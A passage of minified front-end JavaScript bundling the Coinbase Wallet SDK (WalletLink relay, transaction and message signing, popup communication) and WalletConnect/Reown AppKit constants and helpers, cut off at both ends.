button{appearance:none;border:none;background:none;color:#0052ff;padding:0;text-decoration:none;display:block;font-weight:600;font-size:16px;line-height:24px}.-cbwsdk-css-reset .-cbwsdk-redirect-dialog-box.dark{background-color:#0a0b0d;color:#fff}.-cbwsdk-css-reset .-cbwsdk-redirect-dialog-box.dark button{color:#0052ff}.-cbwsdk-css-reset .-cbwsdk-redirect-dialog-box.light{background-color:#fff;color:#0a0b0d}.-cbwsdk-css-reset .-cbwsdk-redirect-dialog-box.light button{color:#0052ff}";class QQe{constructor(){this.root=null,this.darkMode=jne()}attach(){const e=document.documentElement;this.root=document.createElement("div"),this.root.className="-cbwsdk-css-reset",e.appendChild(this.root),Fne()}present(e){this.render(e)}clear(){this.render(null)}render(e){this.root&&(dP(null,this.root),e&&dP(Ki(XQe,Object.assign({},e,{onDismiss:()=>{this.clear()},darkMode:this.darkMode})),this.root))}}const XQe=({title:r,buttonText:e,darkMode:t,onButtonClick:i,onDismiss:n})=>{const s=t?"dark":"light";return Ki(ise,{darkMode:t},Ki("div",{class:"-cbwsdk-redirect-dialog"},Ki("style",null,JQe),Ki("div",{class:"-cbwsdk-redirect-dialog-backdrop",onClick:n}),Ki("div",{class:V5("-cbwsdk-redirect-dialog-box",s)},Ki("p",null,r),Ki("button",{onClick:i},e))))},eXe="https://keys.coinbase.com/connect",tXe="http://rpc.wallet.coinbase.com",PV="https://www.walletlink.org",rXe="https://go.cb-w.com/walletlink";class $V{constructor(){this.attached=!1,this.redirectDialog=new QQe}attach(){if(this.attached)throw new Error("Coinbase Wallet SDK UI is already attached");this.redirectDialog.attach(),this.attached=!0}redirectToCoinbaseWallet(e){const t=new URL(rXe);t.searchParams.append("redirect_url",$Qe().href),e&&t.searchParams.append("wl_url",e);const i=document.createElement("a");i.target="cbw-opener",i.href=t.href,i.rel="noreferrer noopener",i.click()}openCoinbaseWalletDeeplink(e){this.redirectDialog.present({title:"Redirecting to Coinbase Wallet...",buttonText:"Open",onButtonClick:()=>{this.redirectToCoinbaseWallet(e)}}),setTimeout(()=>{this.redirectToCoinbaseWallet(e)},99)}showConnecting(e){return()=>{this.redirectDialog.clear()}}}class qh{constructor(e){this.chainCallbackParams={chainId:"",jsonRpcUrl:""},this.isMobileWeb=RQe(),this.linkedUpdated=s=>{this.isLinked=s;const o=this.storage.getItem(cP);if(s&&(this._session.linked=s),this.isUnlinkedErrorState=!1,o){const a=o.split(" "),c=this.storage.getItem("IsStandaloneSigning")==="true";a[0]!==""&&!s&&this._session.linked&&!c&&(this.isUnlinkedErrorState=!0)}},this.metadataUpdated=(s,o)=>{this.storage.setItem(s,o)},this.chainUpdated=(s,o)=>{this.chainCallbackParams.chainId===s&&this.chainCallbackParams.jsonRpcUrl===o||(this.chainCallbackParams={chainId:s,jsonRpcUrl:o},this.chainCallback&&this.chainCallback(o,Number.parseInt(s,10)))},this.accountUpdated=s=>{this.accountsCallback&&this.accountsCallback([s]),qh.accountRequestCallbackIds.size>0&&(Array.from(qh.accountRequestCallbackIds.values()).forEach(o=>{this.invokeCallback(o,{method:"requestEthereumAccounts",result:[s]})}),qh.accountRequestCallbackIds.clear())},this.resetAndReload=this.resetAndReload.bind(this),this.linkAPIUrl=e.linkAPIUrl,this.storage=e.storage,this.metadata=e.metadata,this.accountsCallback=e.accountsCallback,this.chainCallback=e.chainCallback;const{session:t,ui:i,connection:n}=this.subscribe();this._session=t,this.connection=n,this.relayEventManager=new NQe,this.ui=i,this.ui.attach()}subscribe(){const e=dw.load(this.storage)||dw.create(this.storage),{linkAPIUrl:t}=this,i=new kQe({session:e,linkAPIUrl:t,listener:this}),n=this.isMobileWeb?new $V:new YQe;return i.connect(),{session:e,ui:n,connection:i}}resetAndReload(){this.connection.destroy().then(()=>{const e=dw.load(this.storage);e?.id===this._session.id&&Vd.clearAll(),document.location.reload()}).catch(e=>{})}signEthereumTransaction(e){return this.sendRequest({method:"signEthereumTransaction",params:{fromAddress:e.fromAddress,toAddress:e.toAddress,weiValue:Gu(e.weiValue),data:W5(e.data,!0),nonce:e.nonce,gasPriceInWei:e.gasPriceInWei?Gu(e.gasPriceInWei):null,maxFeePerGas:e.gasPriceInWei?Gu(e.gasPriceInWei):null,maxPriorityFeePerGas:e.gasPriceInWei?Gu(e.gasPriceInWei):null,gasLimit:e.gasLimit?Gu(e.gasLimit):null,chainId:e.chainId,shouldSubmit:!1}})}signAndSubmitEthereumTransaction(e){return this.sendRequest({method:"signEthereumTransaction",params:{fromAddress:e.fromAddress,toAddress:e.toAddress,weiValue:Gu(e.weiValue),data:W5(e.data,!0),nonce:e.nonce,gasPriceInWei:e.gasPriceInWei?Gu(e.gasPriceInWei):null,maxFeePerGas:e.maxFeePerGas?Gu(e.maxFeePerGas):null,maxPriorityFeePerGas:e.maxPriorityFeePerGas?Gu(e.maxPriorityFeePerGas):null,gasLimit:e.gasLimit?Gu(e.gasLimit):null,chainId:e.chainId,shouldSubmit:!0}})}submitEthereumTransaction(e,t){return this.sendRequest({method:"submitEthereumTransaction",params:{signedTransaction:W5(e,!0),chainId:t}})}getWalletLinkSession(){return this._session}sendRequest(e){let t=null;const i=d1(8),n=s=>{this.publishWeb3RequestCanceledEvent(i),this.handleErrorResponse(i,e.method,s),t?.()};return new Promise((s,o)=>{t=this.ui.showConnecting({isUnlinkedErrorState:this.isUnlinkedErrorState,onCancel:n,onResetConnection:this.resetAndReload}),this.relayEventManager.callbacks.set(i,a=>{if(t?.(),oo(a))return o(new Error(a.errorMessage));s(a)}),this.publishWeb3RequestEvent(i,e)})}publishWeb3RequestEvent(e,t){const i={type:"WEB3_REQUEST",id:e,request:t};this.publishEvent("Web3Request",i,!0).then(n=>{}).catch(n=>{this.handleWeb3ResponseMessage(i.id,{method:t.method,errorMessage:n.message})}),this.isMobileWeb&&this.openCoinbaseWalletDeeplink(t.method)}openCoinbaseWalletDeeplink(e){if(this.ui instanceof $V)switch(e){case"requestEthereumAccounts":case"switchEthereumChain":return;default:window.addEventListener("blur",()=>{window.addEventListener("focus",()=>{this.connection.checkUnseenEvents()},{once:!0})},{once:!0}),this.ui.openCoinbaseWalletDeeplink();break}}publishWeb3RequestCanceledEvent(e){const t={type:"WEB3_REQUEST_CANCELED",id:e};this.publishEvent("Web3RequestCanceled",t,!1).then()}publishEvent(e,t,i){return this.connection.publishEvent(e,t,i)}handleWeb3ResponseMessage(e,t){if(t.method==="requestEthereumAccounts"){qh.accountRequestCallbackIds.forEach(i=>this.invokeCallback(i,t)),qh.accountRequestCallbackIds.clear();return}this.invokeCallback(e,t)}handleErrorResponse(e,t,i){var n;const s=(n=i?.message)!==null&&n!==void 0?n:"Unspecified error message.";this.handleWeb3ResponseMessage(e,{method:t,errorMessage:s})}invokeCallback(e,t){const i=this.relayEventManager.callbacks.get(e);i&&(i(t),this.relayEventManager.callbacks.delete(e))}requestEthereumAccounts(){const{appName:e,appLogoUrl:t}=this.metadata,i={method:"requestEthereumAccounts",params:{appName:e,appLogoUrl:t}},n=d1(8);return new Promise((s,o)=>{this.relayEventManager.callbacks.set(n,a=>{if(oo(a))return o(new Error(a.errorMessage));s(a)}),qh.accountRequestCallbackIds.add(n),this.publishWeb3RequestEvent(n,i)})}watchAsset(e,t,i,n,s,o){const a={method:"watchAsset",params:{type:e,options:{address:t,symbol:i,decimals:n,image:s},chainId:o}};let c=null;const l=d1(8),u=d=>{this.publishWeb3RequestCanceledEvent(l),this.handleErrorResponse(l,a.method,d),c?.()};return c=this.ui.showConnecting({isUnlinkedErrorState:this.isUnlinkedErrorState,onCancel:u,onResetConnection:this.resetAndReload}),new Promise((d,h)=>{this.relayEventManager.callbacks.set(l,f=>{if(c?.(),oo(f))return h(new Error(f.errorMessage));d(f)}),this.publishWeb3RequestEvent(l,a)})}addEthereumChain(e,t,i,n,s,o){const a={method:"addEthereumChain",params:{chainId:e,rpcUrls:t,blockExplorerUrls:n,chainName:s,iconUrls:i,nativeCurrency:o}};let c=null;const l=d1(8),u=d=>{this.publishWeb3RequestCanceledEvent(l),this.handleErrorResponse(l,a.method,d),c?.()};return c=this.ui.showConnecting({isUnlinkedErrorState:this.isUnlinkedErrorState,onCancel:u,onResetConnection:this.resetAndReload}),new Promise((d,h)=>{this.relayEventManager.callbacks.set(l,f=>{if(c?.(),oo(f))return h(new Error(f.errorMessage));d(f)}),this.publishWeb3RequestEvent(l,a)})}switchEthereumChain(e,t){const i={method:"switchEthereumChain",params:Object.assign({chainId:e},{address:t})};let n=null;const s=d1(8),o=a=>{this.publishWeb3RequestCanceledEvent(s),this.handleErrorResponse(s,i.method,a),n?.()};return n=this.ui.showConnecting({isUnlinkedErrorState:this.isUnlinkedErrorState,onCancel:o,onResetConnection:this.resetAndReload}),new Promise((a,c)=>{this.relayEventManager.callbacks.set(s,l=>{if(n?.(),oo(l)&&l.errorCode)return c(ni.provider.custom({code:l.errorCode,message:"Unrecognized chain ID. Try adding the chain using addEthereumChain first."}));if(oo(l))return c(new Error(l.errorMessage));a(l)}),this.publishWeb3RequestEvent(s,i)})}}qh.accountRequestCallbackIds=new Set;const RV="DefaultChainId",OV="DefaultJsonRpcUrl";class nse{constructor(e){this._relay=null,this._addresses=[],this.metadata=e.metadata,this._storage=new Vd("walletlink",PV),this.callback=e.callback||null;const t=this._storage.getItem(cP);if(t){const i=t.split(" ");i[0]!==""&&(this._addresses=i.map(n=>lf(n)))}this.initializeRelay()}getSession(){const e=this.initializeRelay(),{id:t,secret:i}=e.getWalletLinkSession();return{id:t,secret:i}}async handshake(){await this._eth_requestAccounts()}get selectedAddress(){return this._addresses[0]||void 0}get jsonRpcUrl(){var e;return(e=this._storage.getItem(OV))!==null&&e!==void 0?e:void 0}set jsonRpcUrl(e){this._storage.setItem(OV,e)}updateProviderInfo(e,t){var i;this.jsonRpcUrl=e;const n=this.getChainId();this._storage.setItem(RV,t.toString(10)),H5(t)!==n&&((i=this.callback)===null||i===void 0||i.call(this,"chainChanged",Df(t)))}async watchAsset(e){const t=Array.isArray(e)?e[0]:e;if(!t.type)throw ni.rpc.invalidParams("Type is required");if(t?.type!=="ERC20")throw ni.rpc.invalidParams(`Asset of type '${t.type}' is not supported`);if(!t?.options)throw ni.rpc.invalidParams("Options are required");if(!t?.options.address)throw ni.rpc.invalidParams("Address is required");const i=this.getChainId(),{address:n,symbol:s,image:o,decimals:a}=t.options,l=await this.initializeRelay().watchAsset(t.type,n,s,a,o,i?.toString());return oo(l)?!1:!!l.result}async addEthereumChain(e){var t,i;const n=e[0];if(((t=n.rpcUrls)===null||t===void 0?void 0:t.length)===0)throw ni.rpc.invalidParams("please pass in at least 1 rpcUrl");if(!n.chainName||n.chainName.trim()==="")throw ni.rpc.invalidParams("chainName is a required field");if(!n.nativeCurrency)throw ni.rpc.invalidParams("nativeCurrency is a required field");const s=Number.parseInt(n.chainId,16);if(s===this.getChainId())return!1;const o=this.initializeRelay(),{rpcUrls:a=[],blockExplorerUrls:c=[],chainName:l,iconUrls:u=[],nativeCurrency:d}=n,h=await o.addEthereumChain(s.toString(),a,u,c,l,d);if(oo(h))return!1;if(((i=h.result)===null||i===void 0?void 0:i.isApproved)===!0)return this.updateProviderInfo(a[0],s),null;throw ni.rpc.internal("unable to add ethereum chain")}async switchEthereumChain(e){const t=e[0],i=Number.parseInt(t.chainId,16),s=await this.initializeRelay().switchEthereumChain(i.toString(10),this.selectedAddress||void 0);if(oo(s))throw s;const o=s.result;return o.isApproved&&o.rpcUrl.length>0&&this.updateProviderInfo(o.rpcUrl,i),null}async cleanup(){this.callback=null,this._relay&&this._relay.resetAndReload(),this._storage.clear()}_setAddresses(e,t){var i;if(!Array.isArray(e))throw new Error("addresses is not an array");const n=e.map(s=>lf(s));JSON.stringify(n)!==JSON.stringify(this._addresses)&&(this._addresses=n,(i=this.callback)===null||i===void 0||i.call(this,"accountsChanged",n),this._storage.setItem(cP,n.join(" ")))}async request(e){const t=e.params||[];switch(e.method){case"eth_accounts":return[...this._addresses];case"eth_coinbase":return this.selectedAddress||null;case"net_version":return this.getChainId().toString(10);case"eth_chainId":return Df(this.getChainId());case"eth_requestAccounts":return this._eth_requestAccounts();case"eth_ecRecover":case"personal_ecRecover":return this.ecRecover(e);case"personal_sign":return this.personalSign(e);case"eth_signTransaction":return this._eth_signTransaction(t);case"eth_sendRawTransaction":return this._eth_sendRawTransaction(t);case"eth_sendTransaction":return this._eth_sendTransaction(t);case"eth_signTypedData_v1":case"eth_signTypedData_v3":case"eth_signTypedData_v4":case"eth_signTypedData":return this.signTypedData(e);case"wallet_addEthereumChain":return this.addEthereumChain(t);case"wallet_switchEthereumChain":return this.switchEthereumChain(t);case"wallet_watchAsset":return this.watchAsset(t);default:if(!this.jsonRpcUrl)throw ni.rpc.internal("No RPC URL set for chain");return eB(e,this.jsonRpcUrl)}}_ensureKnownAddress(e){const t=lf(e);if(!this._addresses.map(n=>lf(n)).includes(t))throw new Error("Unknown Ethereum address")}_prepareTransactionParams(e){const t=e.from?lf(e.from):this.selectedAddress;if(!t)throw new Error("Ethereum address is unavailable");this._ensureKnownAddress(t);const i=e.to?lf(e.to):null,n=e.value!=null?jb(e.value):BigInt(0),s=e.data?aP(e.data):Buffer.alloc(0),o=e.nonce!=null?H5(e.nonce):null,a=e.gasPrice!=null?jb(e.gasPrice):null,c=e.maxFeePerGas!=null?jb(e.maxFeePerGas):null,l=e.maxPriorityFeePerGas!=null?jb(e.maxPriorityFeePerGas):null,u=e.gas!=null?jb(e.gas):null,d=e.chainId?H5(e.chainId):this.getChainId();return{fromAddress:t,toAddress:i,weiValue:n,data:s,nonce:o,gasPriceInWei:a,maxFeePerGas:c,maxPriorityFeePerGas:l,gasLimit:u,chainId:d}}async ecRecover(e){const{method:t,params:i}=e;if(!Array.isArray(i))throw ni.rpc.invalidParams();const s=await this.initializeRelay().sendRequest({method:"ethereumAddressFromSignedMessage",params:{message:HI(i[0]),signature:HI(i[1]),addPrefix:t==="personal_ecRecover"}});if(oo(s))throw s;return s.result}getChainId(){var e;return Number.parseInt((e=this._storage.getItem(RV))!==null&&e!==void 0?e:"1",10)}async _eth_requestAccounts(){var e,t;if(this._addresses.length>0)return(e=this.callback)===null||e===void 0||e.call(this,"connect",{chainId:Df(this.getChainId())}),this._addresses;const n=await this.initializeRelay().requestEthereumAccounts();if(oo(n))throw n;if(!n.result)throw new Error("accounts received is empty");return this._setAddresses(n.result),(t=this.callback)===null||t===void 0||t.call(this,"connect",{chainId:Df(this.getChainId())}),this._addresses}async personalSign({params:e}){if(!Array.isArray(e))throw ni.rpc.invalidParams();const t=e[1],i=e[0];this._ensureKnownAddress(t);const s=await this.initializeRelay().sendRequest({method:"signEthereumMessage",params:{address:lf(t),message:HI(i),addPrefix:!0,typedDataJson:null}});if(oo(s))throw s;return s.result}async _eth_signTransaction(e){const t=this._prepareTransactionParams(e[0]||{}),n=await this.initializeRelay().signEthereumTransaction(t);if(oo(n))throw n;return n.result}async _eth_sendRawTransaction(e){const t=aP(e[0]),n=await this.initializeRelay().submitEthereumTransaction(t,this.getChainId());if(oo(n))throw n;return n.result}async _eth_sendTransaction(e){const t=this._prepareTransactionParams(e[0]||{}),n=await this.initializeRelay().signAndSubmitEthereumTransaction(t);if(oo(n))throw n;return n.result}async signTypedData(e){const{method:t,params:i}=e;if(!Array.isArray(i))throw ni.rpc.invalidParams();const n=l=>{const u={eth_signTypedData_v1:_8.hashForSignTypedDataLegacy,eth_signTypedData_v3:_8.hashForSignTypedData_v3,eth_signTypedData_v4:_8.hashForSignTypedData_v4,eth_signTypedData:_8.hashForSignTypedData_v4};return W5(u[t]({data:rQe(l)}),!0)},s=i[t==="eth_signTypedData_v1"?1:0],o=i[t==="eth_signTypedData_v1"?0:1];this._ensureKnownAddress(s);const c=await this.initializeRelay().sendRequest({method:"signEthereumMessage",params:{address:lf(s),message:n(o),typedDataJson:JSON.stringify(o,null,2),addPrefix:!1}});if(oo(c))throw c;return c.result}initializeRelay(){return this._relay||(this._relay=new qh({linkAPIUrl:PV,storage:this._storage,metadata:this.metadata,accountsCallback:this._setAddresses.bind(this),chainCallback:this.updateProviderInfo.bind(this)})),this._relay}}const sse="SignerType",ose=new Vd("CBWSDK","SignerConfigurator");function iXe(){return ose.getItem(sse)}function nXe(r){ose.setItem(sse,r)}async function sXe(r){const{communicator:e,metadata:t,handshakeRequest:i,callback:n}=r;aXe(e,t,n).catch(()=>{});const s={id:crypto.randomUUID(),event:"selectSignerType",data:Object.assign(Object.assign({},r.preference),{handshakeRequest:i})},{data:o}=await e.postRequestAndWaitForResponse(s);return o}function oXe(r){const{signerType:e,metadata:t,communicator:i,callback:n}=r;switch(e){case"scw":return new gQe({metadata:t,callback:n,communicator:i});case"walletlink":return new nse({metadata:t,callback:n})}}async function aXe(r,e,t){await r.onMessage(({event:n})=>n==="WalletLinkSessionRequest");const i=new nse({metadata:e,callback:t});r.postMessage({event:"WalletLinkUpdate",data:{session:i.getSession()}}),await i.handshake(),r.postMessage({event:"WalletLinkUpdate",data:{connected:!0}})}const cXe=`Coinbase Wallet SDK requires the Cross-Origin-Opener-Policy header to not be set to 'same-origin'. This is to ensure that the SDK can communicate with the Coinbase Smart Wallet app.

Please see https://www.smartwallet.dev/guides/tips/popup-tips#cross-origin-opener-policy for more information.`,lXe=()=>{let r;return{getCrossOriginOpenerPolicy:()=>r===void 0?"undefined":r,checkCrossOriginOpenerPolicy:async()=>{if(typeof window>"u"){r="non-browser-env";return}try{const e=`${window.location.origin}${window.location.pathname}`,t=await fetch(e,{method:"HEAD"});if(!t.ok)throw new Error(`HTTP error! status: ${t.status}`);const i=t.headers.get("Cross-Origin-Opener-Policy");r=i??"null",r==="same-origin"&&console.error(cXe)}catch(e){console.error("Error checking Cross-Origin-Opener-Policy:",e.message),r="error"}}}},{checkCrossOriginOpenerPolicy:uXe,getCrossOriginOpenerPolicy:dXe}=lXe(),BV=420,MV=540;function hXe(r){const e=(window.innerWidth-BV)/2+window.screenX,t=(window.innerHeight-MV)/2+window.screenY;pXe(r);const i=`wallet_${crypto.randomUUID()}`,n=window.open(r,i,`width=${BV}, height=${MV}, left=${e}, top=${t}`);if(n?.focus(),!n)throw ni.rpc.internal("Pop up window failed to open");return n}function fXe(r){r&&!r.closed&&r.close()}function pXe(r){const e={sdkName:Lne,sdkVersion:Y4,origin:window.location.origin,coop:dXe()};for(const[t,i]of Object.entries(e))r.searchParams.append(t,i.toString())}class gXe{constructor({url:e=eXe,metadata:t,preference:i}){this.popup=null,this.listeners=new Map,this.postMessage=async n=>{(await this.waitForPopupLoaded()).postMessage(n,this.url.origin)},this.postRequestAndWaitForResponse=async n=>{const s=this.onMessage(({requestId:o})=>o===n.id);return this.postMessage(n),await s},this.onMessage=async n=>new Promise((s,o)=>{const a=c=>{if(c.origin!==this.url.origin)return;const l=c.data;n(l)&&(s(l),window.removeEventListener("message",a),this.listeners.delete(a))};window.addEventListener("message",a),this.listeners.set(a,{reject:o})}),this.disconnect=()=>{fXe(this.popup),this.popup=null,this.listeners.forEach(({reject:n},s)=>{n(ni.provider.userRejectedRequest("Request rejected")),window.removeEventListener("message",s)}),this.listeners.clear()},this.waitForPopupLoaded=async()=>this.popup&&!this.popup.closed?(this.popup.focus(),this.popup):(this.popup=hXe(this.url),this.onMessage(({event:n})=>n==="PopupUnload").then(this.disconnect).catch(()=>{}),this.onMessage(({event:n})=>n==="PopupLoaded").then(n=>{this.postMessage({requestId:n.id,data:{version:Y4,metadata:this.metadata,preference:this.preference,location:window.location.toString()}})}).then(()=>{if(!this.popup)throw ni.rpc.internal();return this.popup})),this.url=new URL(e),this.metadata=t,this.preference=i}}function mXe(r){const e=JJe(wXe(r),{shouldIncludeStack:!0}),t=new URL("https://docs.cloud.coinbase.com/wallet-sdk/docs/errors");return t.searchParams.set("version",Y4),t.searchParams.set("code",e.code.toString()),t.searchParams.set("message",e.message),Object.assign(Object.assign({},e),{docUrl:t.href})}function wXe(r){var e;if(typeof r=="string")return{message:r,code:Hn.rpc.internal};if(oo(r)){const t=r.errorMessage,i=(e=r.errorCode)!==null&&e!==void 0?e:t.match(/(denied|rejected)/i)?Hn.provider.userRejectedRequest:void 0;return Object.assign(Object.assign({},r),{message:t,code:i,data:{method:r.method}})}return r}var eT={exports:{}},DV;function bXe(){return DV||(DV=1,function(r){var e=Object.prototype.hasOwnProperty,t="~";function i(){}Object.create&&(i.prototype=Object.create(null),new i().__proto__||(t=!1));function n(c,l,u){this.fn=c,this.context=l,this.once=u||!1}function s(c,l,u,d,h){if(typeof u!="function")throw new TypeError("The listener must be a function");var f=new n(u,d||c,h),p=t?t+l:l;return c._events[p]?c._events[p].fn?c._events[p]=[c._events[p],f]:c._events[p].push(f):(c._events[p]=f,c._eventsCount++),c}function o(c,l){--c._eventsCount===0?c._events=new i:delete c._events[l]}function a(){this._events=new i,this._eventsCount=0}a.prototype.eventNames=function(){var l=[],u,d;if(this._eventsCount===0)return l;for(d in u=this._events)e.call(u,d)&&l.push(t?d.slice(1):d);return Object.getOwnPropertySymbols?l.concat(Object.getOwnPropertySymbols(u)):l},a.prototype.listeners=function(l){var u=t?t+l:l,d=this._events[u];if(!d)return[];if(d.fn)return[d.fn];for(var h=0,f=d.length,p=new Array(f);h<f;h++)p[h]=d[h].fn;return p},a.prototype.listenerCount=function(l){var u=t?t+l:l,d=this._events[u];return d?d.fn?1:d.length:0},a.prototype.emit=function(l,u,d,h,f,p){var g=t?t+l:l;if(!this._events[g])return!1;var w=this._events[g],m=arguments.length,x,S;if(w.fn){switch(w.once&&this.removeListener(l,w.fn,void 0,!0),m){case 1:return w.fn.call(w.context),!0;case 2:return w.fn.call(w.context,u),!0;case 3:return w.fn.call(w.context,u,d),!0;case 4:return w.fn.call(w.context,u,d,h),!0;case 5:return w.fn.call(w.context,u,d,h,f),!0;case 6:return w.fn.call(w.context,u,d,h,f,p),!0}for(S=1,x=new Array(m-1);S<m;S++)x[S-1]=arguments[S];w.fn.apply(w.context,x)}else{var T=w.length,k;for(S=0;S<T;S++)switch(w[S].once&&this.removeListener(l,w[S].fn,void 0,!0),m){case 1:w[S].fn.call(w[S].context);break;case 2:w[S].fn.call(w[S].context,u);break;case 3:w[S].fn.call(w[S].context,u,d);break;case 4:w[S].fn.call(w[S].context,u,d,h);break;default:if(!x)for(k=1,x=new Array(m-1);k<m;k++)x[k-1]=arguments[k];w[S].fn.apply(w[S].context,x)}}return!0},a.prototype.on=function(l,u,d){return s(this,l,u,d,!1)},a.prototype.once=function(l,u,d){return s(this,l,u,d,!0)},a.prototype.removeListener=function(l,u,d,h){var f=t?t+l:l;if(!this._events[f])return this;if(!u)return o(this,f),this;var p=this._events[f];if(p.fn)p.fn===u&&(!h||p.once)&&(!d||p.context===d)&&o(this,f);else{for(var g=0,w=[],m=p.length;g<m;g++)(p[g].fn!==u||h&&!p[g].once||d&&p[g].context!==d)&&w.push(p[g]);w.length?this._events[f]=w.length===1?w[0]:w:o(this,f)}return this},a.prototype.removeAllListeners=function(l){var u;return l?(u=t?t+l:l,this._events[u]&&o(this,u)):(this._events=new i,this._eventsCount=0),this},a.prototype.off=a.prototype.removeListener,a.prototype.addListener=a.prototype.on,a.prefixed=t,a.EventEmitter=a,r.exports=a}(eT)),eT.exports}var vXe=bXe();const yXe=Ss(vXe);class xXe extends yXe{}var CXe=function(r,e){var t={};for(var i in r)Object.prototype.hasOwnProperty.call(r,i)&&e.indexOf(i)<0&&(t[i]=r[i]);if(r!=null&&typeof Object.getOwnPropertySymbols=="function")for(var n=0,i=Object.getOwnPropertySymbols(r);n<i.length;n++)e.indexOf(i[n])<0&&Object.prototype.propertyIsEnumerable.call(r,i[n])&&(t[i[n]]=r[i[n]]);return t};class EXe extends xXe{constructor(e){var{metadata:t}=e,i=e.preference,{keysUrl:n}=i,s=CXe(i,["keysUrl"]);super(),this.signer=null,this.isCoinbaseWallet=!0,this.metadata=t,this.preference=s,this.communicator=new gXe({url:n,metadata:t,preference:s});const o=iXe();o&&(this.signer=this.initSigner(o))}async request(e){try{if(pQe(e),!this.signer)switch(e.method){case"eth_requestAccounts":{const t=await this.requestSignerSelection(e),i=this.initSigner(t);await i.handshake(e),this.signer=i,nXe(t);break}case"wallet_sendCalls":{const t=this.initSigner("scw");await t.handshake({method:"handshake"});const i=await t.request(e);return await t.cleanup(),i}case"wallet_getCallsStatus":return eB(e,tXe);case"net_version":return 1;case"eth_chainId":return Df(1);default:throw ni.provider.unauthorized("Must call 'eth_requestAccounts' before other methods")}return await this.signer.request(e)}catch(t){const{code:i}=t;return i===Hn.provider.unauthorized&&this.disconnect(),Promise.reject(mXe(t))}}async enable(){return console.warn('.enable() has been deprecated. Please use .request({ method: "eth_requestAccounts" }) instead.'),await this.request({method:"eth_requestAccounts"})}async disconnect(){var e;await((e=this.signer)===null||e===void 0?void 0:e.cleanup()),this.signer=null,Vd.clearAll(),this.emit("disconnect",ni.provider.disconnected("User initiated disconnection"))}requestSignerSelection(e){return sXe({communicator:this.communicator,preference:this.preference,metadata:this.metadata,handshakeRequest:e,callback:this.emit.bind(this)})}initSigner(e){return oXe({signerType:e,metadata:this.metadata,communicator:this.communicator,callback:this.emit.bind(this)})}}function _Xe(r){if(r){if(!["all","smartWalletOnly","eoaOnly"].includes(r.options))throw new Error(`Invalid options: ${r.options}`);if(r.attribution&&r.attribution.auto!==void 0&&r.attribution.dataSuffix!==void 0)throw new Error("Attribution cannot contain both auto and dataSuffix properties")}}function SXe(r){var e;const t={metadata:r.metadata,preference:r.preference};return(e=fQe(t))!==null&&e!==void 0?e:new EXe(t)}const AXe={options:"all"};function IXe(r){var e;new Vd("CBWSDK").setItem("VERSION",Y4),uXe();const i={metadata:{appName:r.appName||"Dapp",appLogoUrl:r.appLogoUrl||"",appChainIds:r.appChainIds||[]},preference:Object.assign(AXe,(e=r.preference)!==null&&e!==void 0?e:{})};_Xe(i.preference);let n=null;return{getProvider:()=>(n||(n=SXe(i)),n)}}const TXe=Object.freeze(Object.defineProperty({__proto__:null,createCoinbaseWalletSDK:IXe},Symbol.toStringTag,{value:"Module"}));var LV={};const Ht={WC_NAME_SUFFIX:".reown.id",WC_NAME_SUFFIX_LEGACY:".wcn.id",BLOCKCHAIN_API_RPC_URL:"https://rpc.walletconnect.org",PULSE_API_URL:"https://pulse.walletconnect.org",W3M_API_URL:"https://api.web3modal.org",CONNECTOR_ID:{WALLET_CONNECT:"walletConnect",INJECTED:"injected",WALLET_STANDARD:"announced",COINBASE:"coinbaseWallet",COINBASE_SDK:"coinbaseWalletSDK",SAFE:"safe",LEDGER:"ledger",OKX:"okx",EIP6963:"eip6963",AUTH:"ID_AUTH"},CONNECTOR_NAMES:{AUTH:"Auth"},AUTH_CONNECTOR_SUPPORTED_CHAINS:["eip155","solana"],LIMITS:{PENDING_TRANSACTIONS:99},CHAIN:{EVM:"eip155",SOLANA:"solana",POLKADOT:"polkadot",BITCOIN:"bip122"},CHAIN_NAME_MAP:{eip155:"EVM Networks",solana:"Solana",polkadot:"Polkadot",bip122:"Bitcoin",cosmos:"Cosmos"},ADAPTER_TYPES:{BITCOIN:"bitcoin",SOLANA:"solana",WAGMI:"wagmi",ETHERS:"ethers",ETHERS5:"ethers5"},USDT_CONTRACT_ADDRESSES:["0xdac17f958d2ee523a2206206994597c13d831ec7","0xc2132d05d31c914a87c6611c10748aeb04b58e8f","0x9702230a8ea53601f5cd2dc00fdbc13d4df4a8c7","0x919C1c267BC06a7039e03fcc2eF738525769109c","0x48065fbBE25f71C9282ddf5e1cD6D6A887483D5e","0x55d398326f99059fF775485246999027B3197955","0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9"],HTTP_STATUS_CODES:{SERVICE_UNAVAILABLE:503,FORBIDDEN:403},UNSUPPORTED_NETWORK_NAME:"Unknown Network",SECURE_SITE_SDK_ORIGIN:(typeof process<"u"&&typeof LV<"u"?LV.NEXT_PUBLIC_SECURE_SITE_ORIGIN:void 0)||"https://secure.walletconnect.org"},ase={caipNetworkIdToNumber(r){return r?Number(r.split(":")[1]):void 0},parseEvmChainId(r){return typeof r=="string"?this.caipNetworkIdToNumber(r):r},getNetworksByNamespace(r,e){return r?.filter(t=>t.chainNamespace===e)||[]},getFirstNetworkByNamespace(r,e){return this.getNetworksByNamespace(r,e)[0]},getNetworkNameByCaipNetworkId(r,e){if(!e)return;const t=r.find(n=>n.caipNetworkId===e);if(t)return t.name;const[i]=e.split(":");return Ht.CHAIN_NAME_MAP?.[i]||void 0}},kXe={bigNumber(r){return r?new dd(r):new dd(0)},multiply(r,e){if(r===void 0||e===void 0)return new dd(0);const t=new dd(r),i=new dd(e);return t.times(i)},formatNumberToLocalString(r,e=2){return r===void 0?"0.00":typeof r=="number"?r.toLocaleString("en-US",{maximumFractionDigits:e,minimumFractionDigits:e}):parseFloat(r).toLocaleString("en-US",{maximumFractionDigits:e,minimumFractionDigits:e})},parseLocalStringToNumber(r){return r===void 